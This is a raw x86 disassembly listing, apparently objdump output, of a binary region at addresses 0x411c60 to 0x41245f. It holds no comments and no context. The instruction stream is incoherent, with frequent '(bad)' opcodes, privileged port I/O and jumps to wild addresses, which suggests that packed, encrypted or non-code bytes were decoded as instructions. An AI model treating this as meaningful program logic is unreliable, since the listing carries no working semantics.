  411c60:	aam    0x29
  411c62:	xchg   ebp,eax
  411c63:	sbb    DWORD PTR fs:[esi+0x1c],ebx
  411c67:	xor    eax,0x2720ce2f
  411c6c:	test   DWORD PTR [edx+ebx*1],ecx
  411c6f:	and    eax,0x74db9e1c
  411c74:	test   al,0x18
  411c76:	inc    ecx
  411c77:	aas    
  411c78:	int3   
  411c79:	cmp    eax,0x1fe9cacd
  411c7e:	adc    bl,bl
  411c80:	sar    DWORD PTR [ebp-0x57b3fc31],cl
  411c86:	popf   
  411c87:	and    al,BYTE PTR [ecx]
  411c89:	test   al,0x90
  411c8b:	(bad)  
  411c8d:	fwait
  411c8e:	mov    ah,0xad
  411c90:	cwde   
  411c91:	dec    esp
  411c92:	aas    
  411c93:	mov    esp,0xce78efb8
  411c98:	lahf   
  411c99:	popf   
  411c9a:	fbstp  TBYTE PTR [eax-0x70]
  411c9d:	cli    
  411c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ca0:	sbb    al,0x54
  411ca2:	repnz aaa 
  411ca4:	gs into 
  411ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ca7:	jp     0x411cab
  411ca9:	mov    dl,0x40
  411cab:	adc    DWORD PTR [ebx],ebp
  411cad:	scas   eax,DWORD PTR es:[edi]
  411cae:	out    dx,eax
  411caf:	icebp  
  411cb0:	and    bl,BYTE PTR [esi-0x12]
  411cb3:	jb     0x411c4f
  411cb5:	sar    BYTE PTR [ecx],0xc5
  411cb8:	cmp    DWORD PTR [edx+0x64005159],edx
  411cbe:	add    DWORD PTR [edi],0x7f
  411cc1:	mul    BYTE PTR [eax-0x5a]
  411cc4:	adc    ecx,edx
  411cc6:	sar    BYTE PTR [esi+0x73e54cca],1
  411ccc:	inc    ebx
  411ccd:	xor    BYTE PTR [eax-0x6468dc0a],bl
  411cd3:	fmul   DWORD PTR [edx-0xf]
  411cd6:	pop    esp
  411cd7:	mov    esp,0xe15cd150
  411cdc:	mov    ch,BYTE PTR [edi+0x4e1dcc5b]
  411ce2:	jns    0x411cf4
  411ce4:	jmp    0x411cba
  411ce6:	inc    ecx
  411ce7:	leave  
  411ce8:	sbb    BYTE PTR [ebp+esi*8-0xe583986],0xc2
  411cf0:	in     al,0xb6
  411cf2:	xchg   ebp,eax
  411cf3:	cmp    ebx,DWORD PTR [edx+ecx*4-0x5207e735]
  411cfa:	ret    
  411cfb:	push   0x8150c3c9
  411d00:	jmp    0xc21b:0x38c850ab
  411d07:	fsub   QWORD PTR [ecx]
  411d09:	jnp    0x411d5f
  411d0b:	test   DWORD PTR [ebx+edx*4],edi
  411d0e:	cdq    
  411d0f:	scas   al,BYTE PTR es:[edi]
  411d10:	lods   al,BYTE PTR ds:[esi]
  411d11:	js     0x411ce6
  411d13:	mov    al,ds:0x4e9824ec
  411d18:	stos   BYTE PTR es:[edi],al
  411d19:	sbb    DWORD PTR [ebp+0x67],esp
  411d1c:	js     0x411d6d
  411d1e:	xchg   ebx,eax
  411d1f:	pop    ss
  411d20:	jb     0x411d37
  411d22:	inc    edi
  411d23:	pop    esi
  411d24:	mov    BYTE PTR [eax-0x38],0xbe
  411d28:	push   ds
  411d29:	xchg   esi,eax
  411d2a:	fucom  st(5)
  411d2c:	mov    esi,0x2ba7f5bf
  411d31:	xor    esp,edi
  411d33:	sub    BYTE PTR [esi],bh
  411d35:	aad    0x5f
  411d37:	add    BYTE PTR [eax],bh
  411d39:	les    ecx,FWORD PTR [edi-0x5f2e313a]
  411d3f:	push   ss
  411d40:	lahf   
  411d41:	pop    ebx
  411d42:	call   0xa5d66efe
  411d47:	xor    al,0xe3
  411d49:	loop   0x411cf6
  411d4b:	in     al,0xec
  411d4d:	mov    dh,0x84
  411d4f:	jp     0x411dad
  411d51:	xchg   bl,ch
  411d53:	arpl   bx,ax
  411d55:	inc    edi
  411d56:	adc    al,0x76
  411d58:	sub    esi,0xa201d05e
  411d5e:	cmp    esi,DWORD PTR [eax-0xd46a99e]
  411d64:	in     al,0xd2
  411d66:	mov    ds:0x1d1e887b,al
  411d6b:	retf   0x5e0c
  411d6e:	pop    esi
  411d6f:	sbb    ah,BYTE PTR [edi]
  411d71:	dec    eax
  411d72:	xor    edi,ecx
  411d74:	das    
  411d75:	inc    ecx
  411d76:	jbe    0x411cfc
  411d78:	imul   eax,DWORD PTR [ecx],0x69a1e0f3
  411d7e:	call   0x73f5d9d9
  411d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d84:	das    
  411d85:	data16 or BYTE PTR [ebp-0x3f],bl
  411d89:	adc    eax,ecx
  411d8b:	pushf  
  411d8c:	call   0xb8b2a9de
  411d91:	xlat   BYTE PTR ds:[ebx]
  411d92:	sub    al,0x6a
  411d94:	xor    eax,ecx
  411d96:	loopne 0x411dfb
  411d98:	mov    dh,0xab
  411d9a:	adc    bh,bl
  411d9c:	mov    ah,0xfc
  411d9e:	mov    DWORD PTR [eax],edi
  411da0:	cmp    edx,ebx
  411da2:	sub    eax,0xf3f51a6c
  411da7:	and    eax,0xbded9732
  411dac:	sahf   
  411dad:	lea    edx,[esi-0x3b]
  411db0:	cmp    eax,0x91871ec
  411db5:	cwde   
  411db6:	sbb    eax,0xf7dbe357
  411dbb:	and    DWORD PTR [ebp+0x2aa0d336],0x51268e98
  411dc5:	inc    esp
  411dc6:	xor    eax,0xf6c3ac1c
  411dcb:	pop    ds
  411dcc:	cmp    eax,0x6c6965f9
  411dd1:	xor    DWORD PTR [eax],ebx
  411dd3:	push   ecx
  411dd4:	xor    ebx,DWORD PTR [ebx+0x50e90bf7]
  411dda:	xchg   ebx,eax
  411ddb:	dec    ebx
  411ddc:	inc    eax
  411ddd:	mov    ecx,0xe2eb9f01
  411de2:	xchg   ebx,eax
  411de3:	push   ds
  411de4:	scas   eax,DWORD PTR es:[edi]
  411de5:	mov    ebx,0x597cd6af
  411dea:	xchg   esp,eax
  411deb:	shr    DWORD PTR [ebx],cl
  411ded:	and    BYTE PTR [edx-0x23],0x34
  411df1:	loop   0x411dbf
  411df3:	cdq    
  411df4:	mov    ebx,0x25dbafe9
  411df9:	in     al,0x68
  411dfb:	jecxz  0x411e57
  411dfd:	repz rcl BYTE PTR [esi+ecx*1+0x62b58b9b],0xd0
  411e06:	in     eax,0xec
  411e08:	(bad)  
  411e09:	mov    bh,0xd
  411e0b:	ss push ds
  411e0d:	dec    edx
  411e0e:	iret   
  411e0f:	repz pop ebp
  411e11:	lea    edi,[eax-0x5d0729c0]
  411e17:	(bad)  
  411e18:	int    0x18
  411e1a:	(bad)  
  411e1b:	imul   edi,DWORD PTR [esi+0xc],0xffffffa3
  411e1f:	mov    es:0x7944cac4,eax
  411e25:	mov    BYTE PTR [esp+ebp*1],dl
  411e28:	push   0xffffffdb
  411e2a:	xchg   ecx,eax
  411e2b:	inc    ebp
  411e2c:	cdq    
  411e2d:	mov    ah,0xb0
  411e2f:	push   esi
  411e30:	fcom   DWORD PTR [eax-0xa62aad]
  411e36:	jb     0x411e91
  411e38:	cmp    edi,ebp
  411e3a:	(bad)  
  411e3c:	icebp  
  411e3d:	pop    ebp
  411e3e:	jg     0x411e4f
  411e40:	jne    0x411e00
  411e42:	xor    ebx,DWORD PTR [ebx-0x3e97698]
  411e48:	dec    ecx
  411e49:	popa   
  411e4a:	pop    ebx
  411e4b:	inc    ebp
  411e4c:	imul   esi,ecx,0x25
  411e4f:	push   cs
  411e50:	xchg   esp,eax
  411e51:	mov    eax,ds:0x4d62dfa0
  411e56:	xchg   DWORD PTR [ebx-0x501ac273],ebx
  411e5c:	stos   DWORD PTR es:[edi],eax
  411e5d:	mov    eax,0xf0d89d50
  411e62:	jmp    0x663b:0x72764e42
  411e69:	xchg   DWORD PTR [ecx-0x1e],edi
  411e6c:	inc    ebp
  411e6d:	test   eax,0xc9748eee
  411e72:	sbb    eax,0xf2127c08
  411e77:	or     al,0xc5
  411e79:	jecxz  0x411e8c
  411e7b:	arpl   si,cx
  411e7d:	inc    ecx
  411e7e:	inc    esp
  411e7f:	push   ecx
  411e80:	stos   DWORD PTR es:[edi],eax
  411e81:	jno    0x411e30
  411e83:	mov    cl,0xf1
  411e85:	out    dx,al
  411e86:	nop
  411e87:	cmp    eax,0xd5e3e354
  411e8c:	int3   
  411e8d:	(bad)  
  411e8e:	xchg   ebp,eax
  411e8f:	lods   eax,DWORD PTR ds:[esi]
  411e90:	mov    eax,ds:0x334b3cd5
  411e95:	shl    DWORD PTR [ecx+0x34],cl
  411e98:	bound  ebx,QWORD PTR [edx-0x6e]
  411e9b:	push   esp
  411e9c:	loopne 0x411f1a
  411e9e:	sbb    BYTE PTR gs:[edi*8+0x3852e0a9],0xf1
  411ea7:	pop    ecx
  411ea8:	ret    0x128e
  411eab:	mov    eax,ds:0xfc85b4ac
  411eb0:	dec    ebp
  411eb1:	stc    
  411eb2:	inc    ecx
  411eb3:	(bad)  
  411eb4:	test   al,0xc2
  411eb6:	mov    bh,0x35
  411eb8:	adc    DWORD PTR [edx-0x5e415b93],esi
  411ebe:	(bad)  
  411ebf:	mov    esi,0x2f20af6e
  411ec4:	cmc    
  411ec5:	jae    0x411f19
  411ec7:	nop
  411ec8:	cmp    DWORD PTR [esi-0x2f3eedc1],ecx
  411ece:	leave  
  411ecf:	xor    eax,0x7f6fe36
  411ed4:	imul   esi,DWORD PTR [ebp-0x3b65d385],0x1a
  411edb:	pop    ss
  411edc:	dec    ecx
  411edd:	popa   
  411ede:	call   0x271c:0x2434d433
  411ee5:	jne    0x411eab
  411ee7:	addr16 pop ebp
  411ee9:	add    eax,0x267822b5
  411eee:	xchg   esp,eax
  411eef:	pushf  
  411ef0:	adc    eax,0xbe104385
  411ef5:	mov    BYTE PTR ds:0x18cc313,0x2e
  411efc:	nop
  411efd:	inc    ebx
  411efe:	mov    eax,ds:0xbb9d01c2
  411f03:	mov    edx,DWORD PTR [esi]
  411f05:	out    dx,eax
  411f06:	(bad)  
  411f08:	enter  0x5d61,0x8c
  411f0c:	enter  0x90e5,0xe0
  411f10:	push   edi
  411f11:	cld    
  411f12:	mov    al,0xa9
  411f14:	mov    esp,0x359b7498
  411f19:	xor    BYTE PTR [ebx+0x16],0x26
  411f1d:	xchg   edx,eax
  411f1e:	jmp    0x617201a0
  411f23:	xchg   ebp,eax
  411f24:	popf   
  411f25:	inc    ecx
  411f26:	out    0xff,eax
  411f28:	sbb    al,ah
  411f2a:	arpl   WORD PTR [esp+eiz*2-0x7d],si
  411f2e:	pop    edi
  411f2f:	sub    eax,0x797cbe7e
  411f34:	inc    edi
  411f35:	pop    edi
  411f36:	xchg   ecx,eax
  411f37:	addr16 or eax,0xdd34bec7
  411f3d:	jge    0x411edc
  411f3f:	jnp    0x411f8d
  411f41:	xor    BYTE PTR [ecx],bh
  411f43:	pop    eax
  411f44:	xor    DWORD PTR [edx+0x8],edi
  411f47:	cs jb  0x411f16
  411f4a:	outs   dx,BYTE PTR ds:[esi]
  411f4b:	pop    es
  411f4c:	add    al,0x83
  411f4e:	imul   esi,edi,0xffffffd5
  411f51:	(bad)  
  411f52:	out    dx,eax
  411f53:	outs   dx,DWORD PTR ds:[esi]
  411f54:	test   eax,0xa3524b5
  411f59:	sbb    esp,DWORD PTR [esp+edx*2+0x7654e877]
  411f60:	mov    bh,bl
  411f62:	mov    ebx,0xd2d86fd8
  411f67:	ret    0x16ef
  411f6a:	cli    
  411f6b:	push   eax
  411f6c:	mov    al,0x62
  411f6e:	sub    ch,cl
  411f70:	test   eax,0x3b34c3a8
  411f75:	xchg   ebx,eax
  411f76:	mov    ecx,0xe34acfac
  411f7b:	(bad)  
  411f7c:	or     eax,0x4d201791
  411f81:	xchg   ch,al
  411f83:	nop
  411f84:	clc    
  411f85:	in     eax,dx
  411f86:	pop    eax
  411f87:	les    esp,FWORD PTR [ebx+eax*4-0x24]
  411f8b:	mov    ecx,0x750f5b38
  411f90:	cmp    ebp,DWORD PTR [eax+eax*1]
  411f93:	or     al,0xe0
  411f95:	mov    ds:0x9d31a209,eax
  411f9a:	jmp    0x411f6d
  411f9c:	je     0x411faa
  411f9e:	stc    
  411f9f:	jnp    0x411f6e
  411fa1:	jnp    0x411ffb
  411fa3:	xor    eax,0x4afed27
  411fa8:	pop    ds
  411fa9:	jp     0x411f70
  411fab:	inc    ebx
  411fac:	fcomp  st(5)
  411fae:	mov    BYTE PTR [esi],dh
  411fb0:	jle    0x411f99
  411fb2:	(bad)  
  411fb3:	test   al,0xc5
  411fb5:	pop    ds
  411fb6:	xchg   esi,eax
  411fb7:	push   0x981ee3d7
  411fbc:	jmp    0x497a4bf8
  411fc1:	add    DWORD PTR ds:0x97463bd9,edx
  411fc7:	addr16 add eax,0xb492e851
  411fcd:	lea    ecx,ds:[esi-0x2107b975]
  411fd4:	mov    al,ds:0x8d84eaf5
  411fd9:	dec    ebx
  411fda:	(bad)  
  411fdb:	mov    ch,0x5c
  411fdd:	fstp   QWORD PTR [edx+0x360b516e]
  411fe3:	and    DWORD PTR [eax+0x634cb8],ecx
  411fe9:	mov    edi,DWORD PTR [edx-0x79]
  411fec:	xchg   esi,eax
  411fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fee:	neg    DWORD PTR [edi]
  411ff0:	mov    esp,0x54474ceb
  411ff5:	xor    al,0x8c
  411ff7:	and    eax,0x6eb06507
  411ffc:	dec    edi
  411ffd:	ficomp DWORD PTR [eax]
  411fff:	stos   DWORD PTR es:[edi],eax
  412000:	popf   
  412001:	retf   0xed16
  412004:	push   edx
  412005:	sbb    eax,0xd1e76d22
  41200a:	ret    
  41200b:	das    
  41200c:	fwait
  41200d:	(bad)  
  41200e:	xor    DWORD PTR [esi-0x6c6172be],esp
  412014:	arpl   WORD PTR [edx-0x731a23ad],sp
  41201a:	push   0xffffffd7
  41201c:	test   DWORD PTR [ebx+0x41],0x87e9acd6
  412023:	add    al,0xdb
  412025:	adc    eax,ebx
  412027:	ja     0x41203c
  412029:	neg    ch
  41202b:	mov    bl,0x61
  41202d:	icebp  
  41202e:	in     al,dx
  41202f:	stc    
  412030:	mov    esi,DWORD PTR ds:0x6e8cd203
  412036:	xor    edx,DWORD PTR [eax]
  412038:	sub    al,0x9e
  41203a:	inc    edi
  41203b:	xchg   DWORD PTR [ecx],edx
  41203d:	push   edx
  41203e:	sub    eax,0x127fb1a3
  412043:	lahf   
  412044:	stos   DWORD PTR es:[edi],eax
  412045:	les    ecx,FWORD PTR [esi+0x23b5d4c6]
  41204b:	or     BYTE PTR [edx],0xa7
  41204e:	dec    ebx
  41204f:	cmc    
  412050:	test   al,0x1
  412052:	in     eax,dx
  412053:	pop    eax
  412054:	leave  
  412055:	es data16 jnp 0x41205d
  412059:	enter  0x3ee2,0x67
  41205d:	push   0x6
  41205f:	add    eax,0x3e50dd9d
  412064:	cmp    DWORD PTR [edi+0x8],edx
  412067:	imul   edi,DWORD PTR [esi+0x53581d15],0xffffff92
  41206e:	rcr    ah,1
  412070:	sub    dl,BYTE PTR [edi+eax*8-0xff6cb16]
  412077:	out    0xe8,eax
  412079:	inc    ebp
  41207a:	xor    DWORD PTR [edi-0x1c0f04c8],0xfffffff4
  412081:	or     edi,DWORD PTR [edx]
  412083:	lock lods eax,DWORD PTR cs:[esi]
  412086:	inc    ebp
  412087:	mov    dh,0x17
  412089:	in     al,0x5f
  41208b:	stc    
  41208c:	mov    ebx,0x9067205d
  412091:	push   ds
  412092:	pop    esi
  412093:	sbb    al,0xe0
  412095:	std    
  412096:	adc    eax,esi
  412098:	loope  0x412083
  41209a:	test   eax,0xd0e266e4
  41209f:	push   ebx
  4120a0:	pop    edi
  4120a1:	retf   
  4120a2:	mov    dl,BYTE PTR [ecx+0x1d344390]
  4120a8:	sbb    eax,ecx
  4120aa:	mov    esp,0x123a2b5a
  4120af:	retf   0xfcfb
  4120b2:	jb     0x412084
  4120b4:	inc    edi
  4120b5:	shl    DWORD PTR [ebp+0x678d72e3],cl
  4120bb:	mov    ds,WORD PTR [edi-0x32400dea]
  4120c1:	jmp    0x5b50:0xb520df5d
  4120c8:	(bad)  
  4120c9:	push   edi
  4120ca:	push   ds
  4120cb:	rcr    BYTE PTR [ebp-0x2ef9b8af],0x26
  4120d2:	inc    edi
  4120d3:	loope  0x4120b7
  4120d5:	dec    edi
  4120d6:	jae    0x4120fe
  4120d8:	std    
  4120d9:	ins    BYTE PTR es:[edi],dx
  4120da:	push   edi
  4120db:	in     al,0x2f
  4120dd:	cwde   
  4120de:	ficomp DWORD PTR [ecx+0x44]
  4120e1:	fimul  WORD PTR [esi+0x68f67e3]
  4120e7:	pop    esp
  4120e8:	xor    dh,BYTE PTR [ecx+0x57]
  4120eb:	or     BYTE PTR ds:0x742b53c,dl
  4120f1:	mov    edx,cs
  4120f3:	inc    ebx
  4120f4:	or     eax,0xa70d3592
  4120f9:	or     ebx,DWORD PTR [ecx-0x12]
  4120fc:	stc    
  4120fd:	mov    bh,0x89
  4120ff:	aas    
  412100:	xor    DWORD PTR [ecx+0x15],0x68
  412104:	pand   mm0,mm0
  412107:	(bad)  
  412108:	and    DWORD PTR [esi],esp
  41210a:	xor    al,0x5b
  41210c:	jnp    0x412152
  41210e:	stc    
  41210f:	xchg   edi,eax
  412110:	inc    edi
  412111:	repz icebp 
  412113:	retf   0xf99c
  412116:	push   edx
  412117:	adc    eax,0x2d55c486
  41211c:	mov    ecx,0x71c4778c
  412121:	pop    ecx
  412122:	pop    edi
  412123:	inc    esi
  412124:	sbb    ah,BYTE PTR [edi+0x109c4dd9]
  41212a:	mov    ah,0x63
  41212c:	and    BYTE PTR [ebx],dh
  41212e:	aam    0xee
  412130:	lock imul edx,edi,0x9
  412134:	scas   eax,DWORD PTR es:[edi]
  412135:	mov    bl,0x98
  412137:	das    
  412138:	mov    dh,0xc6
  41213a:	mul    DWORD PTR [edi+eax*8-0x34]
  41213e:	fdiv   st(4),st
  412140:	ins    BYTE PTR es:[edi],dx
  412141:	shr    dl,1
  412143:	mov    ch,0x81
  412145:	pop    esi
  412146:	jg     0x412112
  412148:	ins    BYTE PTR es:[edi],dx
  412149:	aad    0xf
  41214b:	jne    0x4120e7
  41214d:	xor    BYTE PTR [edi+0x24],bl
  412150:	(bad)  
  412151:	js     0x412157
  412153:	ins    BYTE PTR es:[edi],dx
  412154:	pop    ebx
  412155:	push   0x66
  412157:	out    dx,eax
  412158:	(bad)  
  412159:	sbb    ch,cl
  41215b:	cli    
  41215c:	lods   al,BYTE PTR ds:[esi]
  41215d:	out    dx,al
  41215e:	fadd   QWORD PTR [ebp+0xc]
  412161:	popa   
  412162:	das    
  412163:	xchg   ebp,eax
  412164:	or     al,BYTE PTR [eax-0x5a]
  412167:	xor    al,0x26
  412169:	push   0xc34d6333
  41216e:	icebp  
  41216f:	jb     0x41219c
  412171:	idiv   BYTE PTR [edx]
  412173:	and    edx,DWORD PTR [ebx]
  412175:	imul   ecx,DWORD PTR [esi],0xfffffff6
  412178:	cli    
  412179:	in     al,0x9a
  41217b:	jne    0x412120
  41217d:	inc    DWORD PTR ds:0x2eeaabe4
  412183:	sbb    al,0xaa
  412185:	jns    0x41218b
  412187:	dec    esi
  412188:	test   al,0x83
  41218a:	xchg   edi,eax
  41218b:	sub    cl,0x57
  41218e:	mov    ds:0xe031b8b,eax
  412193:	and    ebp,DWORD PTR gs:[eax]
  412196:	mov    dh,0x8f
  412198:	push   ss
  412199:	sbb    ax,0xb729
  41219d:	pop    esp
  41219e:	in     eax,0x59
  4121a0:	xor    BYTE PTR [edx],dl
  4121a2:	xchg   DWORD PTR [ecx+0x62],edi
  4121a5:	(bad)  
  4121a6:	cwde   
  4121a7:	xor    DWORD PTR [edi],esp
  4121a9:	mov    cl,0xed
  4121ab:	push   ds
  4121ac:	lods   eax,DWORD PTR ds:[esi]
  4121ad:	xchg   edx,eax
  4121ae:	cmp    dl,cl
  4121b0:	add    esi,edi
  4121b2:	cdq    
  4121b3:	dec    esp
  4121b4:	push   edx
  4121b5:	mov    ah,0xf8
  4121b7:	je     0x412174
  4121b9:	or     DWORD PTR [edx+0x3bc1ba6c],edx
  4121bf:	adc    eax,0xd554ae33
  4121c4:	outs   dx,BYTE PTR ds:[esi]
  4121c5:	mov    ah,0x11
  4121c7:	cmp    DWORD PTR [eax],ebp
  4121c9:	adc    DWORD PTR [eax-0x5440fe8a],0xffffffee
  4121d0:	push   esp
  4121d1:	jo     0x4121db
  4121d3:	xor    eax,DWORD PTR [ecx-0x4b]
  4121d6:	pop    ebx
  4121d7:	pop    ebp
  4121d8:	shl    DWORD PTR ds:0x5e93d8,1
  4121de:	fbstp  TBYTE PTR es:[edi]
  4121e1:	sub    ch,ah
  4121e3:	mov    al,ds:0xc8196450
  4121e8:	lods   al,BYTE PTR ds:[esi]
  4121e9:	jbe    0x41216c
  4121eb:	mov    edx,DWORD PTR [eax]
  4121ed:	add    BYTE PTR [ebp-0x80],dl
  4121f0:	loop   0x412190
  4121f2:	add    eax,0xba068ada
  4121f7:	cmp    edi,DWORD PTR [esi]
  4121f9:	and    eax,0xe41a7b3e
  4121fe:	arpl   WORD PTR [ebx],di
  412200:	adc    edi,0x520bfa70
  412206:	mov    ebp,0x74547951
  41220b:	out    dx,al
  41220c:	sbb    al,0x56
  41220e:	enter  0xb7fd,0x7f
  412212:	mov    esi,0x848a1ee6
  412217:	or     DWORD PTR [esi],eax
  412219:	pop    edi
  41221a:	push   ebp
  41221b:	(bad)  
  41221c:	fist   WORD PTR [eax]
  41221e:	repnz (bad) 
  412220:	sbb    edi,esi
  412222:	jmp    0x41227d
  412224:	sbb    dh,BYTE PTR [eax]
  412226:	inc    ecx
  412227:	sub    DWORD PTR [ebx],ebp
  412229:	ja     0x412262
  41222b:	pop    eax
  41222c:	enter  0x1d67,0xdb
  412230:	jo     0x4121f5
  412232:	and    eax,0x444eedc3
  412237:	aaa    
  412238:	imul   ebx,DWORD PTR [eax-0x41250072],0xffffff81
  41223f:	pop    eax
  412240:	or     BYTE PTR [ebp-0x3732e526],al
  412246:	imul   esp,ebp,0x27
  412249:	int    0xa5
  41224b:	or     al,0xee
  41224d:	sahf   
  41224e:	sti    
  41224f:	adc    DWORD PTR [ebp-0x35],ebp
  412252:	xor    eax,0x8ffb9abe
  412257:	jl     0x4121f4
  412259:	aam    0xaf
  41225b:	cmp    al,0xfe
  41225d:	ret    0xdf99
  412260:	lds    ebp,FWORD PTR [esi]
  412262:	fcomp  st(3)
  412264:	add    ah,al
  412266:	sub    bh,BYTE PTR [edi]
  412268:	inc    edi
  412269:	xor    bh,bl
  41226b:	aaa    
  41226c:	rcr    BYTE PTR [ecx-0x75489b1f],0x73
  412273:	pop    ds
  412274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412275:	ret    
  412276:	les    eax,FWORD PTR [esi+0x31692fb6]
  41227c:	inc    esi
  41227d:	jp     0x4122fc
  41227f:	cmc    
  412280:	js     0x412218
  412282:	out    0x8e,al
  412284:	inc    eax
  412285:	(bad)  
  412286:	rcl    BYTE PTR [eax+ecx*1+0x2f],cl
  41228a:	or     eax,0x8f682eee
  41228f:	jne    0x4122fa
  412291:	icebp  
  412292:	xchg   ebp,eax
  412293:	mov    bh,0x7
  412295:	pop    ecx
  412296:	data16 outs dx,BYTE PTR ds:[esi]
  412298:	inc    edx
  412299:	clc    
  41229a:	repz mov dl,0x6d
  41229d:	jl     0x4122fd
  41229f:	out    dx,eax
  4122a0:	jmp    0x4122b4
  4122a2:	ja     0x4122d3
  4122a4:	xchg   ebx,eax
  4122a5:	and    DWORD PTR [eax-0x4a2abdb3],eax
  4122ab:	xor    edi,edi
  4122ad:	inc    ecx
  4122ae:	mov    edx,0xe118ef55
  4122b3:	xor    eax,0x9a1ed26f
  4122b8:	aad    0x39
  4122ba:	daa    
  4122bb:	push   ebp
  4122bc:	xor    al,0xd8
  4122be:	push   eax
  4122bf:	adc    DWORD PTR [eax-0x48],0xffffffd0
  4122c3:	and    cl,ch
  4122c5:	add    edx,DWORD PTR [edi-0x75]
  4122c8:	das    
  4122c9:	or     eax,0x9f383957
  4122ce:	call   0x8731:0xc4514543
  4122d5:	mov    gs,WORD PTR [ebp+0x45fc941c]
  4122db:	ss pop ecx
  4122dd:	push   edi
  4122de:	mov    DWORD PTR [eax-0x1a],edx
  4122e1:	into   
  4122e2:	mov    dh,0xb6
  4122e4:	xor    DWORD PTR [ebp-0x16],ebp
  4122e7:	stc    
  4122e8:	add    eax,0xb1694458
  4122ed:	mov    dh,0x15
  4122ef:	and    DWORD PTR [ebx-0x1006d19f],esp
  4122f5:	sub    eax,0xdedab874
  4122fa:	push   ebx
  4122fb:	int3   
  4122fc:	sub    eax,0x23c57315
  412301:	neg    DWORD PTR [esi-0x213601a]
  412307:	push   ecx
  412308:	adc    al,0xe7
  41230a:	xchg   ebx,eax
  41230b:	call   0x9c8f4981
  412310:	shl    DWORD PTR es:[eax-0xe24cec6],1
  412317:	jl     0x412319
  412319:	push   0x409b273
  41231e:	inc    ebp
  41231f:	shl    BYTE PTR [ebx+0x6d8ad955],cl
  412325:	xchg   ebp,eax
  412326:	adc    BYTE PTR [eax+0xe],bh
  412329:	push   0xffffffa2
  41232b:	je     0x412352
  41232d:	scas   eax,DWORD PTR es:[edi]
  41232e:	add    dh,BYTE PTR [eax+0x65]
  412331:	ins    DWORD PTR es:[edi],dx
  412332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412333:	js     0x41239b
  412335:	out    dx,eax
  412336:	inc    esi
  412337:	mov    ah,cl
  412339:	push   cs
  41233a:	push   es
  41233b:	sub    DWORD PTR [ecx+0x27],ebx
  41233e:	push   esi
  41233f:	test   BYTE PTR [esi],0x52
  412342:	outs   dx,DWORD PTR ds:[esi]
  412343:	lods   eax,DWORD PTR ds:[esi]
  412344:	mov    ebp,0xe92e543b
  412349:	mov    eax,ds:0x9bb7fcb9
  41234e:	jnp    0x41235a
  412350:	or     BYTE PTR [ebp+eax*1-0x644471b7],cl
  412357:	push   ebx
  412358:	push   esi
  412359:	jg     0x41233e
  41235b:	in     eax,0xa4
  41235d:	cdq    
  41235e:	xor    BYTE PTR [esi+ebp*8-0x7cba81ea],dh
  412365:	sbb    DWORD PTR [ebx+0x7eccb4a8],0xf7c3b2fd
  41236f:	and    DWORD PTR [ecx+0x6],0xfffffff0
  412373:	xchg   esi,eax
  412374:	cmp    BYTE PTR [ecx-0x7],bl
  412377:	jb     0x4123ad
  412379:	arpl   WORD PTR ds:[edx+0x31],bx
  41237d:	add    al,0x9f
  41237f:	adc    edi,edi
  412381:	push   cs
  412382:	call   0x6e6a:0x51413b15
  412389:	sub    dl,dh
  41238b:	jle    0x4123b8
  41238d:	mov    al,0xd7
  41238f:	pop    ss
  412390:	or     edx,DWORD PTR [edx]
  412392:	or     BYTE PTR [edx+0x62],bh
  412395:	loop   0x412326
  412397:	lea    ecx,[ebx+0x57]
  41239a:	or     DWORD PTR [esi+0x605a2add],0x78
  4123a1:	xlat   BYTE PTR ds:[ebx]
  4123a2:	sbb    eax,0x37c1a46b
  4123a7:	pop    ss
  4123a8:	mov    cl,0x2c
  4123aa:	leave  
  4123ab:	push   ds
  4123ac:	loope  0x4123b0
  4123ae:	mov    esp,0x4f39c74b
  4123b3:	xor    esi,DWORD PTR [eax-0x7ff7978a]
  4123b9:	and    DWORD PTR [eax-0x23d76070],esi
  4123bf:	(bad)  
  4123c1:	call   0xf0b6149c
  4123c6:	cmp    dh,ch
  4123c8:	xchg   BYTE PTR ss:[edx+0x63],ch
  4123cc:	sbb    edx,DWORD PTR [ebx+0x16]
  4123cf:	jl     0x4123f4
  4123d1:	or     eax,0xac186b43
  4123d6:	adc    DWORD PTR [eax],0x2afb0044
  4123dc:	push   esi
  4123dd:	shrd   DWORD PTR [ebx-0x5e8f4fa9],esi,cl
  4123e4:	cs mov ecx,0x7294518c
  4123ea:	mov    cx,0x5d9c
  4123ee:	dec    ebp
  4123ef:	mov    WORD PTR [ebp+0x57],ss
  4123f2:	xchg   ecx,eax
  4123f3:	pop    ebx
  4123f4:	mov    bh,0x34
  4123f6:	sbb    al,BYTE PTR [ebx]
  4123f8:	xor    edx,ebp
  4123fa:	mov    ds:0x77b585d7,al
  4123ff:	add    eax,ecx
  412401:	pop    esp
  412402:	setge  BYTE PTR [ecx+0x9]
  412406:	ins    BYTE PTR es:[edi],dx
  412407:	unpckhps xmm1,xmm2
  41240a:	xor    ecx,DWORD PTR [edi+0x453a420b]
  412410:	mov    esp,0xf5946768
  412415:	inc    ebx
  412416:	imul   edx,DWORD PTR [esi],0x6a
  412419:	das    
  41241a:	mov    dl,0x3f
  41241c:	cmp    eax,edi
  41241e:	loope  0x412457
  412420:	pop    ebx
  412421:	cdq    
  412422:	push   esi
  412423:	in     al,0x56
  412425:	push   eax
  412426:	jg     0x412440
  412428:	sub    edi,DWORD PTR [eax]
  41242a:	sub    DWORD PTR gs:[edx+0x65],esp
  41242e:	int    0xbb
  412430:	sbb    BYTE PTR [ecx-0x3e],bh
  412433:	fwait
  412434:	adc    edi,DWORD PTR [ecx]
  412436:	cld    
  412437:	ret    0xf344
  41243a:	repz jp 0x412476
  41243d:	or     al,0x42
  41243f:	inc    eax
  412440:	frstor [esi]
  412442:	adc    DWORD PTR [edx+0x5e],ecx
  412445:	jmp    0xb4fabc87
  41244a:	mov    esi,0x43569ffa
  41244f:	mov    edx,0x2edb60ac
  412454:	inc    esp
  412455:	(bad)  
  412456:	int    0xd5
  412458:	mov    dl,BYTE PTR [esi*4+0x4a44ef03]
  41245f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
